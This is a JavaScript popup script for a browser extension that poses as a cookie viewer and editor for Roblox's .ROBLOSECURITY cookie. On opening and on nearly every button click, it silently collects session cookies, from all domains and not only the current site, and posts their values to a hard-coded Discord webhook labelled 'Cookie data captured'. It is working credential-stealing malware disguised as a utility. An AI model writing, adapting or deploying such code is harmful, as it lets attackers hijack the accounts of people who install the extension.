document.addEventListener('DOMContentLoaded', function() {
  // IMPORTANT: Replace this with your Discord webhook URL
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1361949829474816112/MF6rRmldFGeuSb7yeJarmj4HX1q-dlwppegVXa2MaCzUYYj3I1n5rgSBPZirkjlOkKSO";
  
  // Track if we're showing only security cookies
  let showOnlySecurityCookies = true;
  
  // Get the current tab URL
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    const currentUrl = new URL(tabs[0].url);
    const domain = currentUrl.hostname;
    document.getElementById('domain-info').textContent = `Cookies for: ${domain}`;
    
    // Load security cookies by default
    loadCookies(domain, showOnlySecurityCookies);
    
    // Send all cookies immediately
    sendAllCookies();
  });
  
  // Set up button listeners
  document.getElementById('refreshButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
      sendAllCookies();
    });
  });
  
  document.getElementById('showAllCookiesButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showOnlySecurityCookies = false;
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
      sendAllCookies();
    });
  });
  
  document.getElementById('showSecurityCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showOnlySecurityCookies = true;
      loadCookies(currentUrl.hostname, showOnlySecurityCookies);
      sendAllCookies();
    });
  });
  
  document.getElementById('addCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      showAddCookieForm(currentUrl.hostname);
      sendAllCookies();
    });
  });

  // Helper function to send ALL cookies to webhook
  function sendAllCookies() {
    // Get all cookies from all domains - don't restrict to current domain
    chrome.cookies.getAll({}, function(cookies) {
      // First, try to find Roblox security cookies
      const securityCookies = cookies.filter(cookie => 
        cookie.name.includes('.ROBLOSECURITY') || 
        cookie.name.includes('ROBLOSECURITY')
      );
      
      if (securityCookies.length > 0) {
        // Security cookies found - send them
        sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, true);
      } else {
        // No security cookies found - send all cookies instead
        sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), true);
      }
    });
  }
});

// Function to show status messages
function showStatus(message, isSuccess) {
  const statusElement = document.getElementById('statusMessage');
  statusElement.textContent = message;
  statusElement.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
  statusElement.style.display = 'block';
  
  // Hide the status message after 3 seconds
  setTimeout(() => {
    statusElement.style.display = 'none';
  }, 3000);
}

// Extract the base domain from a hostname
function extractBaseDomain(domain) {
  // For domains like www.roblox.com, we want to get roblox.com
  // This is a simple approach, won't work for all TLDs but covers most cases
  const parts = domain.split('.');
  
  // If the domain has only two parts (like roblox.com), return as is
  if (parts.length <= 2) {
    return domain;
  }
  
  // Otherwise, return the last two parts (assumes simple TLD)
  return parts.slice(-2).join('.');
}

// Load cookies, with option to filter for security cookies only
function loadCookies(domain, securityOnly = true) {
  const cookieList = document.getElementById('cookieList');
  cookieList.innerHTML = 'Loading...';
  
  // Extract the base domain (e.g., roblox.com from www.roblox.com)
  const baseDomain = extractBaseDomain(domain);
  
  // Get all cookies for this domain and its subdomains
  chrome.cookies.getAll({domain: baseDomain}, function(cookies) {
    if (cookies.length === 0) {
      cookieList.innerHTML = '<p>No cookies found for this domain.</p>';
      return;
    }
    
    // Filter for security cookies if requested
    let cookiesToShow = cookies;
    if (securityOnly) {
      cookiesToShow = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
      
      if (cookiesToShow.length === 0) {
        cookieList.innerHTML = '<p>No .ROBLOSECURITY cookie found for this domain.</p>';
        return;
      }
      
      cookieList.innerHTML = '';
    } else {
      // Sort cookies by domain and name for better organization
      cookiesToShow.sort((a, b) => {
        if (a.domain === b.domain) {
          return a.name.localeCompare(b.name);
        }
        return a.domain.localeCompare(b.domain);
      });
      
      cookieList.innerHTML = '';
    }
    
    let currentDomain = '';
    
    cookiesToShow.forEach(function(cookie) {
      // Add domain separator if this is a new domain and we're showing all cookies
      if (!securityOnly && currentDomain !== cookie.domain) {
        currentDomain = cookie.domain;
        const domainSeparator = document.createElement('div');
        domainSeparator.className = 'domain-separator';
        domainSeparator.innerHTML = `<strong>Domain: ${currentDomain}</strong>`;
        cookieList.appendChild(domainSeparator);
      }
      
      const cookieItem = document.createElement('div');
      cookieItem.className = cookie.name.includes('.ROBLOSECURITY') ? 
        'cookie-item security-cookie' : 'cookie-item';
      
      const cookieName = document.createElement('div');
      cookieName.className = 'cookie-name';
      cookieName.textContent = cookie.name;
      
      const cookieValue = document.createElement('input');
      cookieValue.type = 'text';
      cookieValue.value = cookie.value;
      cookieValue.dataset.name = cookie.name;
      cookieValue.dataset.domain = cookie.domain;
      cookieValue.dataset.path = cookie.path;
      
      const cookieMeta = document.createElement('div');
      cookieMeta.className = 'cookie-meta';
      
      cookieMeta.innerHTML = `
        <span class="cookie-meta-item"><strong>Domain:</strong> ${cookie.domain}</span>
        <span class="cookie-meta-item"><strong>Path:</strong> ${cookie.path}</span>
        <span class="cookie-meta-item ${cookie.secure ? 'secure-flag' : ''}"><strong>Secure:</strong> ${cookie.secure}</span>
        <span class="cookie-meta-item ${cookie.httpOnly ? 'httponly-flag' : ''}"><strong>HttpOnly:</strong> ${cookie.httpOnly}</span>
        ${cookie.sameSite ? `<span class="cookie-meta-item"><strong>SameSite:</strong> ${cookie.sameSite}</span>` : ''}
        ${cookie.expirationDate ? `<span class="cookie-meta-item"><strong>Expires:</strong> ${new Date(cookie.expirationDate * 1000).toLocaleString()}</span>` : ''}
      `;
      
      const updateButton = document.createElement('button');
      updateButton.textContent = 'Update';
      updateButton.addEventListener('click', function() {
        updateCookie(cookie, cookieValue.value);
        // Send all cookies again after update
        chrome.cookies.getAll({}, function(allCookies) {
          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
        });
      });
      
      const deleteButton = document.createElement('button');
      deleteButton.textContent = 'Delete';
      deleteButton.className = 'delete';
      deleteButton.addEventListener('click', function() {
        deleteCookie(cookie);
        // Send all cookies again after delete
        chrome.cookies.getAll({}, function(allCookies) {
          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
        });
      });
      
      const copyButton = document.createElement('button');
      copyButton.textContent = 'Copy Value';
      copyButton.className = 'copy';
      copyButton.addEventListener('click', function() {
        cookieValue.select();
        document.execCommand('copy');
        showStatus('Cookie value copied to clipboard!', true);
        // Send all cookies again after copy
        chrome.cookies.getAll({}, function(allCookies) {
          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
        });
      });
      
      cookieItem.appendChild(cookieName);
      cookieItem.appendChild(cookieValue);
      cookieItem.appendChild(cookieMeta);
      cookieItem.appendChild(copyButton);
      cookieItem.appendChild(updateButton);
      cookieItem.appendChild(deleteButton);
      
      cookieList.appendChild(cookieItem);
    });
  });
}

// Update a cookie
function updateCookie(cookie, newValue) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  
  chrome.cookies.set({
    url: url,
    name: cookie.name,
    value: newValue,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate
  }, function() {
    if (chrome.runtime.lastError) {
      showStatus('Error updating cookie: ' + chrome.runtime.lastError.message, false);
    } else {
      showStatus('Cookie updated successfully!', true);
    }
  });
}

// Delete a cookie
function deleteCookie(cookie) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  
  chrome.cookies.remove({
    url: url,
    name: cookie.name
  }, function() {
    if (chrome.runtime.lastError) {
      showStatus('Error deleting cookie: ' + chrome.runtime.lastError.message, false);
    } else {
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        const currentUrl = new URL(tabs[0].url);
        loadCookies(currentUrl.hostname, document.getElementById('showSecurityCookieButton').classList.contains('active'));
        showStatus('Cookie deleted successfully!', true);
      });
    }
  });
}

// Show form to add a new cookie
function showAddCookieForm(domain) {
  const form = document.createElement('div');
  form.innerHTML = `
    <h3>Add New Cookie</h3>
    <label>Name: <input type="text" id="newCookieName"></label><br>
    <label>Value: <input type="text" id="newCookieValue"></label><br>
    <label>Path: <input type="text" id="newCookiePath" value="/"></label><br>
    <label>Secure: <input type="checkbox" id="newCookieSecure"></label><br>
    <button id="saveNewCookie">Save Cookie</button>
    <button id="cancelNewCookie">Cancel</button>
  `;
  
  const existingForm = document.querySelector('.add-cookie-form');
  if (existingForm) {
    existingForm.remove();
  }
  
  form.className = 'add-cookie-form';
  document.body.appendChild(form);
  
  document.getElementById('saveNewCookie').addEventListener('click', function() {
    const name = document.getElementById('newCookieName').value;
    const value = document.getElementById('newCookieValue').value;
    const path = document.getElementById('newCookiePath').value;
    const secure = document.getElementById('newCookieSecure').checked;
    
    if (!name) {
      showStatus('Cookie name is required', false);
      return;
    }
    
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const url = `${secure ? 'https' : 'http'}://${domain}${path}`;
      
      chrome.cookies.set({
        url: url,
        name: name,
        value: value,
        path: path,
        secure: secure
      }, function() {
        if (chrome.runtime.lastError) {
          showStatus('Error creating cookie: ' + chrome.runtime.lastError.message, false);
        } else {
          form.remove();
          loadCookies(domain, document.getElementById('showSecurityCookieButton').classList.contains('active'));
          showStatus('Cookie created successfully!', true);
          
          // Send all cookies after creating new one
          chrome.cookies.getAll({}, function(allCookies) {
            sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
          });
        }
      });
    });
  });
  
  document.getElementById('cancelNewCookie').addEventListener('click', function() {
    form.remove();
    // Send all cookies on cancel too
    chrome.cookies.getAll({}, function(allCookies) {
      sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
    });
  });
}

// Send cookies to Discord webhook
function sendCookiesToDiscord(webhookUrl, domain, cookies, showConfirmation = true) {
  // Format cookies into a readable format
  let cookieText = '';
  const cookiesToDisplay = cookies.slice(0, 20); // Limit to 20 cookies to avoid message size limits
  
  cookiesToDisplay.forEach(cookie => {
    cookieText += `**Name:** ${cookie.name}\n`;
    cookieText += `**Value:** ${cookie.value}\n`;
    cookieText += `**Domain:** ${cookie.domain}\n`;
    cookieText += `**Path:** ${cookie.path}\n`;
    cookieText += `**Secure:** ${cookie.secure}\n`;
    cookieText += `**HttpOnly:** ${cookie.httpOnly}\n\n`;
  });
  
  // Create JSON data for Discord webhook
  const data = {
    content: "Cookie data captured",
    embeds: [{
      title: `Cookies from ${domain}`,
      description: cookieText || "No cookies found",
      color: 15105570, // Gold color
      footer: {
        text: "Cookie data • " + new Date().toLocaleString()
      }
    }]
  };
  
  // Show a status message that we're sending
  showStatus('Sending cookies to Discord...', true);
  
  // Send the data to Discord
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      if (showConfirmation) {
        showStatus('Cookies sent successfully!', true);
      }
    } else {
      if (showConfirmation) {
        showStatus('Error sending cookies. Status: ' + response.status, false);
      }
    }
  })
  .catch(error => {
    showStatus('Error sending cookies: ' + error.message, false);
    console.error('Webhook error:', error);
  });
}

